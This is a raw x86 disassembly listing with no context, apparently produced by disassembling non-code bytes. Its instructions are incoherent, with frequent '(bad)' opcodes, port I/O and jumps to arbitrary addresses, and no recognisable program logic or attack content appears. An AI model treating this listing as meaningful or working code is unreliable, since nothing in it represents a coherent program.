  4388e5:	lds    edi,FWORD PTR [esi+ebp*1-0x33]
  4388e9:	mov    dh,0x77
  4388eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4388ec:	and    DWORD PTR [eax-0x44],0x986bfc6b
  4388f3:	and    al,0xe0
  4388f5:	pop    ss
  4388f6:	(bad)  [edi+0x749cd853]
  4388fc:	sahf   
  4388fd:	jle    0x438951
  4388ff:	inc    esp
  438900:	fidivr WORD PTR [edx]
  438902:	popa   
  438903:	adc    edx,ebp
  438905:	pusha  
  438906:	call   0xe22:0x7eaa13d
  43890d:	inc    esp
  43890e:	and    BYTE PTR [ebp-0x6b78a0a0],dl
  438914:	imul   edi,esp,0xffffff8d
  438917:	add    DWORD PTR [edx],0xa2729993
  43891d:	sub    DWORD PTR [eax-0x5f],esi
  438920:	add    BYTE PTR [edx+0x4e],0x62
  438924:	loopne 0x4388f9
  438926:	cmp    DWORD PTR [edi+0x5e],edi
  438929:	pop    edi
  43892a:	jecxz  0x4389a0
  43892c:	mov    edi,0xdd79cfc1
  438931:	push   0xdded990
  438936:	in     eax,dx
  438937:	dec    esp
  438938:	loope  0x438945
  43893a:	fstp   TBYTE PTR [edi+0x5e]
  43893d:	mov    ch,0x3e
  43893f:	(bad)  
  438940:	(bad)  
  438941:	sub    esp,edi
  438943:	adc    al,0xb
  438945:	popa   
  438946:	inc    dl
  438948:	inc    edx
  438949:	mov    ds:0x4a4bc2f,al
  43894e:	out    dx,eax
  43894f:	xor    al,0x8b
  438951:	cld    
  438952:	test   DWORD PTR [ecx+0x2d8e6b7a],esp
  438958:	out    0x42,eax
  43895a:	cwde   
  43895b:	mov    bl,0x87
  43895d:	pop    edi
  43895e:	mov    eax,0x659c9d50
  438963:	jne    0x43891b
  438965:	(bad)  
  438967:	dec    eax
  438968:	pop    edx
  438969:	xchg   esi,eax
  43896a:	jbe    0x4389ba
  43896c:	adc    eax,0x31542e23
  438971:	outs   dx,DWORD PTR ds:[esi]
  438972:	mov    eax,es:0x7d8b4806
  438978:	in     eax,dx
  438979:	nop
  43897a:	inc    esi
  43897b:	xchg   ebp,eax
  43897c:	pop    esi
  43897d:	pop    esi
  43897e:	adc    al,0x83
  438980:	dec    ebx
  438981:	mov    dh,0xf
  438983:	push   ebp
  438984:	inc    edx
  438985:	popa   
  438986:	mov    esi,edx
  438988:	lahf   
  438989:	fimul  DWORD PTR [ecx]
  43898b:	sbb    al,0xab
  43898d:	inc    edi
  43898e:	out    dx,al
  43898f:	push   ebx
  438990:	sub    DWORD PTR [ebx*4-0x2dfe595b],ebx
  438997:	mov    al,ds:0xc552e6d6
  43899c:	mov    esi,0x5ee15554
  4389a1:	ror    BYTE PTR [edx+0x37],cl
  4389a4:	mov    ecx,0xbb1c9a06
  4389a9:	pusha  
  4389aa:	imul   ecx,DWORD PTR [esi-0x76],0xf5dc8f94
  4389b1:	jmp    DWORD PTR [eax-0x70]
  4389b4:	pop    ebx
  4389b5:	and    ebp,DWORD PTR [bx+di]
  4389b8:	push   ecx
  4389b9:	xchg   esi,eax
  4389ba:	cs jno 0x438985
  4389bd:	loopne 0x4389d9
  4389bf:	mov    eax,ds:0x591ffaf6
  4389c4:	inc    ebx
  4389c5:	jnp    0x43897f
  4389c7:	loope  0x438a05
  4389c9:	gs in  eax,dx
  4389cb:	xlat   BYTE PTR ds:[ebx]
  4389cc:	pop    esi
  4389cd:	xchg   esp,eax
  4389ce:	pop    ss
  4389cf:	sbb    DWORD PTR [eax+0xf],edx
  4389d2:	adc    DWORD PTR [edi-0x5e6d641e],0xd7418833
  4389dc:	pop    ds
  4389dd:	call   0x61142501
  4389e2:	or     ah,cl
  4389e4:	je     0x438a53
  4389e6:	xchg   BYTE PTR [eax],ch
  4389e8:	mul    BYTE PTR [eax+0x6d]
  4389eb:	jecxz  0x438a0b
  4389ed:	mov    ch,0x20
  4389ef:	sbb    al,dl
  4389f1:	sub    dh,0x5f
  4389f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4389f5:	out    dx,al
  4389f6:	adc    DWORD PTR [ecx],edx
  4389f8:	mov    al,ds:0x888ea163
  4389fd:	cld    
  4389fe:	mov    DWORD PTR [ecx],esp
  438a00:	out    dx,al
  438a01:	jnp    0x438992
  438a03:	xchg   ebx,eax
  438a04:	or     eax,0x9abffc9
  438a09:	fucomip st,st(6)
  438a0b:	retf   
  438a0c:	adc    dh,ch
  438a0e:	mov    eax,0x8759921c
  438a13:	adc    ch,BYTE PTR [edi]
  438a15:	dec    edx
  438a16:	push   ecx
  438a17:	and    DWORD PTR [esi],edi
  438a19:	add    eax,0x6952710a
  438a1e:	scas   al,BYTE PTR es:[edi]
  438a1f:	cmp    BYTE PTR ds:0x1522bffe,bl
  438a25:	sub    al,BYTE PTR [edx-0xd]
  438a28:	pop    edx
  438a29:	dec    ebx
  438a2a:	mov    bl,0xba
  438a2c:	xchg   ebx,eax
  438a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438a2e:	push   esp
  438a2f:	stos   BYTE PTR es:[edi],al
  438a30:	xor    al,0x61
  438a32:	add    al,0x2a
  438a34:	mov    ebx,0xb611850f
  438a39:	pusha  
  438a3a:	clc    
  438a3b:	repnz (bad) 
  438a3d:	hlt    
  438a3e:	inc    esp
  438a3f:	aam    0xc6
  438a41:	pop    ebx
  438a42:	out    dx,al
  438a43:	jmp    0x3b9d7be5
  438a48:	cmp    ebx,ebp
  438a4a:	(bad)  
  438a4b:	adc    al,ah
  438a4d:	xor    BYTE PTR [eax+0x165aedf7],ch
  438a53:	pop    esi
  438a54:	mov    dl,0x54
  438a56:	pop    eax
  438a57:	cmp    eax,0xa1662412
  438a5c:	or     esp,ecx
  438a5e:	out    0xcb,eax
  438a60:	jno    0x438a53
  438a62:	pop    esi
  438a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438a64:	sar    BYTE PTR [ecx],cl
  438a66:	jmp    0xcfd7:0x3ebb4edc
  438a6d:	mov    esi,ebp
  438a6f:	pop    ss
  438a70:	aaa    
  438a71:	lock sbb BYTE PTR [ebx-0x3f],cl
  438a75:	out    0x88,al
  438a77:	in     al,dx
  438a78:	jo     0x438acc
  438a7a:	mov    al,ds:0x26385242
  438a7f:	jg     0x438ad8
  438a81:	sub    al,0xee
  438a83:	or     DWORD PTR ds:0xeaecb888,ebp
  438a89:	ja     0x438a7b
  438a8b:	mov    al,ds:0x66ecf768
  438a90:	jo     0x438a9e
  438a92:	cmp    eax,0x54da5e83
  438a97:	sahf   
  438a98:	lods   eax,DWORD PTR ds:[esi]
  438a99:	fnstenv [di-0x1e]
  438a9d:	call   0x15b9326a
  438aa2:	mov    DWORD PTR [edx-0x15],ebx
  438aa5:	adc    BYTE PTR [edx+0x4f],dl
  438aa8:	pop    ebp
  438aa9:	add    eax,0x74ad6eed
  438aae:	ror    BYTE PTR [edx+esi*2-0x3fdfa14e],0x51
  438ab6:	push   ebp
  438ab7:	cs aaa 
  438ab9:	out    dx,al
  438aba:	push   cs
  438abb:	push   ss
  438abc:	pop    ebp
  438abd:	jge    0x438a71
  438abf:	test   al,0x5e
  438ac1:	out    0x46,eax
  438ac3:	aam    0x40
  438ac5:	and    al,0xbc
  438ac7:	es hlt 
  438ac9:	lock repz mov al,ds:0xe2d1a805
  438ad0:	fstp   DWORD PTR [eax-0x1b]
  438ad3:	sbb    BYTE PTR [esi-0x6b],0x3e
  438ad7:	test   al,0x72
  438ad9:	mov    ah,BYTE PTR [edx+ecx*4]
  438adc:	or     ah,BYTE PTR [ecx-0x7d]
  438adf:	in     eax,dx
  438ae0:	daa    
  438ae1:	out    dx,al
  438ae2:	rcr    BYTE PTR [edx+ebp*4],0x8
  438ae6:	pop    esi
  438ae7:	fs pop ebx
  438ae9:	ficomp WORD PTR [ebx]
  438aeb:	sbb    ch,cl
  438aed:	cmp    BYTE PTR [edi],dh
  438aef:	cmc    
  438af0:	lea    ebp,[edx+0x24]
  438af3:	pop    ecx
  438af4:	jle    0x438b70
  438af6:	pop    ss
  438af7:	mov    ebp,0xa19d8724
  438afc:	pop    ds
  438afd:	scas   al,BYTE PTR es:[edi]
  438afe:	mov    esp,0xee68717d
  438b03:	sti    
  438b04:	mov    ebx,0x31e6e97
  438b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438b0a:	pop    ebp
  438b0b:	mov    eax,ds:0x1cd81740
  438b10:	mov    ah,0xe1
  438b12:	loop   0x438b41
  438b14:	pop    ebp
  438b15:	in     eax,0x90
  438b17:	jns    0x438ac4
  438b19:	popa   
  438b1a:	xlat   BYTE PTR ds:[ebx]
  438b1b:	ins    BYTE PTR es:[edi],dx
  438b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b1d:	push   0x60827385
  438b22:	push   0x5a1e1607
  438b27:	les    eax,FWORD PTR [edx]
  438b29:	shr    esi,1
  438b2b:	mov    edx,0x37d36d32
  438b30:	pop    edi
  438b31:	fisub  WORD PTR [eax+eiz*4]
  438b34:	jae    0x438b43
  438b36:	outs   dx,DWORD PTR ds:[esi]
  438b37:	enter  0xa39e,0x8c
  438b3b:	push   ds
  438b3c:	jmp    0x438b92
  438b3e:	loope  0x438b08
  438b40:	pop    esi
  438b41:	cmp    dh,BYTE PTR [esi+0x2e]
  438b44:	lahf   
  438b45:	xor    ecx,DWORD PTR [edx]
  438b47:	cmp    dl,BYTE PTR [ecx+0x15]
  438b4a:	lods   al,BYTE PTR ds:[esi]
  438b4b:	addr16 pop esi
  438b4d:	cmp    ecx,esp
  438b4f:	or     eax,0x81996395
  438b54:	jo     0x438b02
  438b56:	jmp    0xde71:0x1e1b5d23
  438b5d:	push   eax
  438b5e:	rcl    BYTE PTR [ebx-0x6c],cl
  438b61:	adc    al,0xf6
  438b63:	xor    al,0x5e
  438b65:	retf   0x6683
  438b68:	lock dec ebp
  438b6a:	xchg   edi,eax
  438b6b:	pop    es
  438b6c:	pop    esi
  438b6d:	or     BYTE PTR [edx-0x2],ah
  438b70:	imul   esi,DWORD PTR [ebx+0x2],0xe05ea726
  438b77:	icebp  
  438b78:	mov    bl,0xd0
  438b7a:	retf   
  438b7b:	jl     0x438b7b
  438b7d:	(bad)  
  438b7e:	cmc    
  438b7f:	inc    ebp
  438b80:	xor    ecx,ebx
  438b82:	shl    BYTE PTR [edx+ecx*2-0x6178192e],1
  438b89:	dec    edi
  438b8a:	push   ds
  438b8b:	push   0xb
  438b8d:	jae    0x438bd0
  438b8f:	xor    eax,0x3ee36160
  438b94:	pop    edx
  438b95:	mov    al,ds:0xd5e82a9
  438b9a:	mov    edi,0x57c31b9e
  438b9f:	(bad)  
  438ba0:	outs   dx,DWORD PTR ds:[esi]
  438ba1:	pusha  
  438ba2:	scas   al,BYTE PTR es:[edi]
  438ba3:	sbb    ah,BYTE PTR [ecx+0x256c08ce]
  438ba9:	retf   
  438baa:	out    dx,eax
  438bab:	sbb    BYTE PTR [edi+ebx*4-0x4c],0xe0
  438bb0:	aad    0x58
  438bb2:	cli    
  438bb3:	xlat   BYTE PTR ds:[ebx]
  438bb4:	cmp    bl,BYTE PTR [ecx]
  438bb6:	pusha  
  438bb7:	fnsave [edx]
  438bb9:	ds out dx,al
  438bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438bbc:	std    
  438bbd:	sub    DWORD PTR [eax-0x26],edx
  438bc0:	out    0x66,al
  438bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438bc4:	clc    
  438bc5:	es pop es
  438bc7:	scas   al,BYTE PTR es:[edi]
  438bc8:	pop    DWORD PTR [edx]
  438bca:	lea    esp,[esi-0x5f3ee4e5]
  438bd0:	retf   
  438bd1:	push   0x3d
  438bd3:	or     eax,0xb8ed6e7d
  438bd8:	pop    ebp
  438bd9:	inc    esi
  438bda:	dec    eax
  438bdb:	icebp  
  438bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438bdd:	and    ebp,DWORD PTR [edx]
  438bdf:	pusha  
  438be0:	mov    al,0x60
  438be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438be3:	jnp    0x438b92
  438be5:	pop    eax
  438be6:	push   es
  438be7:	std    
  438be8:	(bad)  
  438be9:	jecxz  0x438bd9
  438beb:	das    
  438bec:	sti    
  438bed:	dec    edx
  438bee:	sub    eax,0xe55fc6bf
  438bf3:	mov    eax,ds:0xe8d1bdcd
  438bf8:	lods   eax,DWORD PTR ds:[esi]
  438bf9:	ins    BYTE PTR es:[edi],dx
  438bfa:	sbb    DWORD PTR [ecx+0x55],edi
  438bfd:	pmaxsw mm2,QWORD PTR [edi-0xe]
  438c01:	call   0xe3f:0x13eb896c
  438c08:	xchg   esi,eax
  438c09:	sbb    bl,dl
  438c0b:	lock addr16 jp 0x438bdb
  438c0f:	push   ebp
  438c10:	adc    cl,ah
  438c12:	pop    esp
  438c13:	push   ebx
  438c14:	cmp    eax,0x15a8ebf4
  438c19:	xor    al,0x6e
  438c1b:	rcr    BYTE PTR [eax+0x11],0x5a
  438c1f:	int    0xdf
  438c21:	(bad)
  438c24:	fnsave [esp+esi*8-0x20]
  438c28:	fdivp  st(4),st
  438c2a:	adc    DWORD PTR ds:0x71c36048,edx
  438c30:	cmp    esp,DWORD PTR [edx+0x4136d9ef]
  438c36:	jo     0x438bdc
  438c38:	adc    ah,BYTE PTR [eax+edi*4-0x51]
  438c3c:	adc    ch,BYTE PTR [eax]
  438c3e:	out    dx,al
  438c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438c40:	mov    ebx,DWORD PTR [esi*8-0x6633ef7b]
  438c47:	mov    eax,ds:0xc79db7b6
  438c4c:	out    dx,al
  438c4d:	stos   BYTE PTR es:[edi],al
  438c4e:	sub    al,0xb0
  438c50:	jl     0x438c02
  438c52:	jmp    DWORD PTR [ecx+esi*8]
  438c55:	push   esi
  438c56:	daa    
  438c57:	repnz cdq 
  438c59:	jns    0x438c99
  438c5b:	jo     0x438c0f
  438c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438c5e:	jbe    0x438c01
  438c60:	mov    esi,0x2a42e8fb
  438c65:	rol    ecx,1
  438c67:	xchg   esi,eax
  438c68:	pop    esi
  438c69:	adc    BYTE PTR ds:0xa929fbfb,0x7c
  438c70:	mov    ch,0x5f
  438c72:	ins    BYTE PTR es:[edi],dx
  438c73:	cmovnp edi,DWORD PTR [edx+eiz*2]
  438c77:	popf   
  438c78:	sub    al,0x31
  438c7a:	mov    bl,0x3a
  438c7c:	fldenv ss:[ebx+0x47]
  438c80:	mov    al,0xce
  438c82:	out    dx,al
  438c83:	jle    0x438cb4
  438c85:	stos   BYTE PTR es:[edi],al
  438c86:	popa   
  438c87:	pushf  
  438c88:	stc    
  438c89:	cmp    eax,DWORD PTR [ebx+edx*2]
  438c8c:	in     eax,dx
  438c8d:	loopne 0x438c60
  438c8f:	push   ebp
  438c90:	leave  
  438c91:	jns    0x438c94
  438c93:	cmc    
  438c94:	daa    
  438c95:	xor    ebp,DWORD PTR [esi]
  438c97:	xchg   esp,eax
  438c98:	dec    ebx
  438c99:	pop    eax
  438c9a:	mov    ebp,0x95613860
  438c9f:	sbb    al,0x57
  438ca1:	adc    edi,edi
  438ca3:	pop    es
  438ca4:	mov    cl,0x8d
  438ca6:	out    dx,al
  438ca7:	adc    DWORD PTR [esp+esi*8-0x7b2abc0e],ecx
  438cae:	pop    ebx
  438caf:	mov    eax,ds:0xe5fb76b3
  438cb4:	fisttp QWORD PTR [ebx-0x2]
  438cb7:	cli    
  438cb8:	pop    esi
  438cb9:	jno    0x438d0d
  438cbb:	adc    DWORD PTR [ebx],esp
  438cbd:	icebp  
  438cbe:	(bad)  
  438cbf:	xor    ebp,DWORD PTR [eax-0xc53b7a0]
  438cc5:	sub    al,0xcc
  438cc7:	jmp    0xba2f27dd
  438ccc:	(bad)  
  438cce:	pop    ebp
  438ccf:	(bad)  
  438cd1:	cwde   
  438cd2:	in     eax,dx
  438cd3:	mov    bh,0xa1
  438cd5:	fs aam 0xf1
  438cd8:	and    cl,BYTE PTR [eax+0x6ee947ee]
  438cde:	pop    es
  438cdf:	(bad)  
  438ce0:	dec    eax
  438ce1:	imul   ebx
  438ce3:	call   0xb49e3698
  438ce8:	in     al,dx
  438ce9:	lock add ch,al
  438cec:	jns    0x438d4e
  438cee:	jmp    0x438d3c
  438cf0:	inc    ecx
  438cf1:	adc    al,0x34
  438cf3:	call   0xbc324b29
  438cf8:	xor    eax,0x730df0bd
  438cfd:	mov    ?,WORD PTR [esi-0x5f]
  438d00:	mov    dh,0x46
  438d02:	sbb    eax,0xe97be1f0
  438d07:	ja     0x438d67
  438d09:	pusha  
  438d0a:	add    DWORD PTR [edx+0xc],eax
  438d0d:	(bad)  
  438d0f:	jmp    0xf6ffec1f
  438d14:	xchg   esi,eax
  438d15:	xor    BYTE PTR [ebp+0x37],ah
  438d18:	imul   eax,eax,0x5e
  438d1b:	push   es
  438d1c:	sbb    ah,BYTE PTR [eax+0x3e]
  438d1f:	leave  
  438d20:	jno    0x438cc0
  438d22:	sub    ebp,DWORD PTR [ecx-0x23]
  438d25:	cwde   
  438d26:	std    
  438d27:	mov    DWORD PTR [esi+0x51],ebx
  438d2a:	xchg   ecx,eax
  438d2b:	mul    BYTE PTR [edi+eiz*2+0x43c3ad88]
  438d32:	jge    0x438d94
  438d34:	xor    esp,DWORD PTR [ecx]
  438d36:	outs   dx,DWORD PTR ds:[esi]
  438d37:	sub    ebp,edi
  438d39:	bound  ecx,QWORD PTR [ecx-0x6c699f6e]
  438d3f:	loope  0x438cda
  438d41:	or     ch,BYTE PTR [eax+0x61]
  438d44:	dec    esi
  438d45:	inc    esp
  438d46:	mov    bl,0xa0
  438d48:	aas    
  438d49:	pop    esi
  438d4a:	idiv   BYTE PTR [esi+0x478a0811]
  438d50:	fs stos DWORD PTR es:[edi],eax
  438d52:	push   edi
  438d53:	adc    edi,DWORD PTR [ecx+0x3f]
  438d56:	xchg   edi,eax
  438d57:	adc    ah,BYTE PTR [ebx]
  438d59:	mov    edx,0x51b906ce
  438d5e:	in     eax,0x55
  438d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438d61:	mov    eax,ds:0x84af2ccd
  438d66:	mov    ?,WORD PTR [ecx+0x62]
  438d69:	sbb    ebp,edi
  438d6b:	aad    0x2d
  438d6d:	inc    ebp
  438d6e:	inc    ebp
  438d6f:	popa   
  438d70:	push   ds
  438d71:	das    
  438d72:	icebp  
  438d73:	and    al,0x64
  438d75:	pop    ebp
  438d76:	test   DWORD PTR [edi+edi*4+0x45],0x3ba820e6
  438d7e:	xchg   edx,eax
  438d7f:	push   ebp
  438d80:	pop    esi
  438d81:	xor    DWORD PTR [esi],esp
  438d83:	out    0x18,eax
  438d85:	mov    edi,0x615bd836
  438d8a:	lahf   
  438d8b:	dec    ebx
  438d8c:	fisubr DWORD PTR [eax-0x3eacfc0e]
  438d92:	out    dx,al
  438d93:	out    dx,eax
  438d94:	xchg   ebp,eax
  438d95:	dec    eax
  438d96:	iret   
  438d97:	sbb    BYTE PTR [ebx-0x2c6fdac2],bh
  438d9d:	rcl    BYTE PTR [esi+0x7],1
  438da0:	mov    bh,0x60
  438da2:	imul   ebx,edi,0xffffffa3
  438da5:	popf   
  438da6:	stos   DWORD PTR es:[edi],eax
  438da7:	ds push 0x426d0391
  438dad:	imul   ebx
  438daf:	cld    
  438db0:	int3   
  438db1:	jmp    0x438dd8
  438db3:	or     DWORD PTR [edi+ecx*8+0x6f949f91],ecx
  438dba:	add    BYTE PTR [esi+0x31c0c80],bl
  438dc0:	sbb    eax,0xbee155c0
  438dc5:	mov    ds:0x96f5300a,al
  438dca:	out    dx,al
  438dcb:	jbe    0x438e00
  438dcd:	xlat   BYTE PTR ds:[ebx]
  438dce:	retf   0xaeba
  438dd1:	jo     0x438e4c
  438dd3:	adc    esi,0xdbc42167
  438dd9:	icebp  
  438dda:	xor    DWORD PTR [esi+0x32],esi
  438ddd:	xor    DWORD PTR [eax-0x11b0058e],ecx
  438de3:	dec    edi
  438de4:	outs   dx,BYTE PTR ds:[esi]
  438de5:	pop    edx
  438de6:	jns    0x438e07
  438de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438de9:	test   ch,0xa0
  438dec:	cmp    BYTE PTR [edi+edi*2-0x6f],dl
  438df0:	(bad)  
  438df1:	sbb    BYTE PTR [edi-0xc],dl
  438df4:	js     0x438dd6
  438df6:	adc    bh,BYTE PTR [ebx+0x52]
  438df9:	retf   0x2125
  438dfc:	push   esp
  438dfd:	ret    
  438dfe:	xor    edi,DWORD PTR [esi-0x32]
  438e01:	(bad)
  438e05:	add    ebx,esp
  438e07:	and    BYTE PTR [esi],dh
  438e09:	ins    DWORD PTR es:[edi],dx
  438e0a:	dec    ebp
  438e0b:	mov    edi,0xfeed9799
  438e10:	push   ds
  438e11:	clc    
  438e12:	(bad)  
  438e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438e15:	test   al,0x6e
  438e17:	jg     0x438e2a
  438e19:	pop    esp
  438e1a:	add    eax,0xeec682aa
  438e1f:	inc    edx
  438e20:	push   ebx
  438e21:	test   al,0x1a
  438e23:	gs xor al,0xbb
  438e26:	cdq    
  438e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438e28:	ret    0x6126
  438e2b:	xor    esi,DWORD PTR [edx]
  438e2d:	loope  0x438e80
  438e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438e30:	lods   eax,DWORD PTR ds:[esi]
  438e31:	sbb    ebp,esi
  438e33:	(bad)  
  438e34:	rcr    DWORD PTR [esi-0x5ee84f09],cl
  438e3a:	and    DWORD PTR [ecx-0x1122364b],esp
  438e40:	mov    BYTE PTR [ecx-0x33],dh
  438e43:	adc    DWORD PTR [esi],esi
  438e45:	push   ebx
  438e46:	cwde   
  438e47:	lods   al,BYTE PTR ds:[esi]
  438e48:	loop   0x438eaa
  438e4a:	test   al,0x61
  438e4c:	in     al,dx
  438e4d:	(bad)  
  438e4f:	pop    ecx
  438e50:	jo     0x438e1a
  438e52:	sahf   
  438e53:	mov    eax,ds:0xc237bfbc
  438e58:	mov    ch,0x1c
  438e5a:	adc    ebp,DWORD PTR [ebx+0x5e]
  438e5d:	push   esi
  438e5e:	loopne 0x438e43
  438e60:	lock and BYTE PTR [edi+0x12],0x3b
  438e65:	popa   
  438e66:	or     al,0xde
  438e68:	loopne 0x438ed9
  438e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438e6b:	hlt    
  438e6c:	into   
  438e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438e6e:	in     eax,dx
  438e6f:	or     ecx,DWORD PTR [eax+0x3b]
  438e72:	in     eax,0xc5
  438e74:	sub    dl,bh
  438e76:	pop    esi
  438e77:	data16 jno 0x438edb
  438e7a:	dec    esi
  438e7b:	dec    edi
  438e7c:	pop    ebp
  438e7d:	jb     0x438eb0
  438e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438e80:	pop    ds
  438e81:	push   cs
  438e82:	adc    ch,BYTE PTR [ebp-0x6b]
  438e85:	scas   al,BYTE PTR es:[edi]
  438e86:	out    dx,al
  438e87:	mov    ?,WORD PTR [esi+0x23624d7a]
  438e8d:	ds dec edx
  438e8f:	mov    eax,ds:0xf84b2338
  438e94:	nop
  438e95:	sbb    eax,DWORD PTR [edi+0x6f]
  438e98:	pop    esi
  438e99:	aas    
  438e9a:	imul   esi,DWORD PTR [ebx-0x3bd8cd24],0x5a
  438ea1:	popa   
  438ea2:	jo     0x438eb5
  438ea4:	jno    0x438ebc
  438ea6:	fisttp WORD PTR [bp+si]
  438ea9:	jno    0x438ebb
  438eab:	ret    0x655f
  438eae:	and    al,0x21
  438eb0:	sub    eax,DWORD PTR [ebp+0x1b]
  438eb3:	cmp    eax,0xa108fbde
  438eb8:	push   eax
  438eb9:	lods   al,BYTE PTR ds:[esi]
  438eba:	pmaxub mm5,QWORD PTR [edx-0x21]
  438ebe:	add    dh,0xf7
  438ec1:	mov    edx,0x894e32ee
  438ec6:	shl    BYTE PTR gs:[edi],cl
  438ec9:	in     eax,dx
  438eca:	mov    WORD PTR [ecx+0x92e390c],fs
  438ed0:	pop    edx
  438ed1:	iret   
  438ed2:	popa   
  438ed3:	cld    
  438ed4:	(bad)  
  438ed5:	mov    ch,0xee
  438ed7:	mov    edx,0x761e2805
  438edc:	xchg   esi,eax
  438edd:	adc    DWORD PTR [esi],eax
  438edf:	repnz and DWORD PTR [ebp-0x29],0xffffffad
  438ee4:	pop    esi
  438ee5:	faddp  st(3),st
  438ee7:	jle    0x438f03
  438ee9:	pusha  
  438eea:	mov    esi,0x4b025f5e
  438eef:	pop    ebp
  438ef0:	arpl   WORD PTR ds:0x763029a7,bp
  438ef6:	outs   dx,BYTE PTR ds:[esi]
  438ef7:	sub    DWORD PTR [ebp+0x2a],edx
  438efa:	adc    eax,0xeefd3d59
  438eff:	data16 icebp 
  438f01:	xor    BYTE PTR [esi-0x17],dh
  438f04:	adc    dh,BYTE PTR [edx]
  438f06:	xchg   esi,eax
  438f07:	mov    eax,ds:0x18185b17
  438f0c:	cmp    al,0xea
  438f0e:	push   ebx
  438f0f:	push   esi
  438f10:	pop    esi
  438f11:	inc    edi
  438f12:	out    dx,eax
  438f13:	mov    ds:0xebfa6e,al
  438f18:	adc    BYTE PTR [ebx-0x2],dl
  438f1b:	das    
  438f1c:	jp     0x438f90
  438f1e:	mov    ds,WORD PTR [ebp-0x8]
  438f21:	jmp    0x5c987910
  438f26:	fild   WORD PTR [ebx]
  438f28:	ficom  WORD PTR [edx+0x191f4ded]
  438f2e:	shr    DWORD PTR [ecx-0x5ea5edeb],1
  438f34:	add    edi,DWORD PTR [esp+edx*1]
  438f37:	cmp    BYTE PTR [eax+edi*1+0x715ee2b4],dh
  438f3e:	pop    ebp
  438f3f:	loop   0x438fb4
  438f41:	jle    0x438f10
  438f43:	push   eax
  438f44:	jb     0x438ef9
  438f46:	popa   
  438f47:	test   eax,0xa443b56a
  438f4c:	lock leave 
  438f4e:	pop    ds
  438f4f:	rcl    BYTE PTR [edx+0x1a3c36be],0x43
  438f56:	out    dx,al
  438f57:	sub    bl,BYTE PTR [esi]
  438f59:	sbb    ebx,DWORD PTR [edx]
  438f5b:	neg    BYTE PTR ds:[ebx+0xd]
  438f5f:	fnstsw WORD PTR [ebp-0x33]
  438f62:	out    dx,al
  438f63:	inc    esp
  438f64:	lock int3 
  438f66:	add    DWORD PTR [edi],ecx
  438f68:	or     BYTE PTR [edi-0x29],cl
  438f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438f6c:	jo     0x438efd
  438f6e:	cld    
  438f6f:	clc    
  438f70:	mov    ebx,0x6eb6eea8
  438f75:	adc    eax,0x5223b318
  438f7a:	invd   
  438f7c:	mov    ds:0x7d1ee1c,al
  438f81:	xor    edx,esp
  438f83:	add    ebx,DWORD PTR [ebp-0x31]
  438f86:	test   al,0x48
  438f88:	jcxz   0x438f97
  438f8b:	(bad)  
  438f8c:	push   0xffffffaa
  438f8e:	sbb    ah,BYTE PTR [ebp+0x43809dd6]
  438f94:	push   0xffffffa0
  438f96:	cwde   
  438f97:	mov    ds:0xa0602ea1,eax
  438f9c:	push   ecx
  438f9d:	dec    ebp
  438f9e:	stos   BYTE PTR es:[edi],al
  438f9f:	shl    DWORD PTR [ecx],cl
  438fa1:	loope  0x438f6d
  438fa3:	cs ins DWORD PTR es:[edi],dx
  438fa5:	retf   
  438fa6:	std    
  438fa7:	cmp    bh,ch
  438fa9:	pusha  
  438faa:	xor    eax,0x40bb9097
  438faf:	scas   al,BYTE PTR es:[edi]
  438fb0:	pop    edx
  438fb1:	jb     0x438fa1
  438fb3:	adc    al,0x29
  438fb5:	mov    ecx,0xb01973
  438fba:	mov    DWORD PTR [ecx+0x5104672a],esp
  438fc0:	nop
  438fc1:	push   ecx
  438fc2:	mov    bh,0x74
  438fc4:	mov    esi,0xe90178e8
  438fc9:	and    ebp,esi
  438fcb:	push   ebp
  438fcc:	pop    edx
  438fcd:	push   es
  438fce:	ror    esp,0xb2
  438fd1:	jb     0x43903a
  438fd3:	mov    eax,ds:0x952e5bbd
  438fd8:	xor    eax,DWORD PTR [ecx-0x1d]
  438fdb:	call   FWORD PTR [esi-0xc]
  438fde:	jb     0x439012
  438fe0:	ins    BYTE PTR es:[edi],dx
  438fe1:	addr16 (bad) 
  438fe3:	and    eax,0xf6826144
  438fe8:	call   0xc3586174
  438fed:	mov    dh,0xee
  438fef:	pop    ds
  438ff0:	arpl   WORD PTR [esi+0x76],sp
  438ff3:	inc    ebx
  438ff4:	int    0x81
  438ff6:	scas   al,BYTE PTR es:[edi]
  438ff7:	lahf   
  438ff8:	test   eax,0x53dbc4f3
  438ffd:	and    DWORD PTR [ebp+0x5a],edx
  439000:	scas   eax,DWORD PTR es:[edi]
  439001:	ss mov ecx,0x92125ed9
  439007:	cmc    
  439008:	ret    
  439009:	popa   
  43900a:	xor    esp,ebp
  43900c:	and    ah,BYTE PTR [ecx+0x46]
  43900f:	and    edi,DWORD PTR [esi+0x7c]
  439012:	adc    al,0x69
  439014:	aam    0x24
  439016:	out    dx,al
  439017:	sub    BYTE PTR [esi+0x6],0xa3
  43901b:	adc    eax,0xa17116e4
  439020:	fdivr  st(2),st
  439022:	inc    ebx
  439023:	mov    ecx,0xd411957a
  439028:	pop    esi
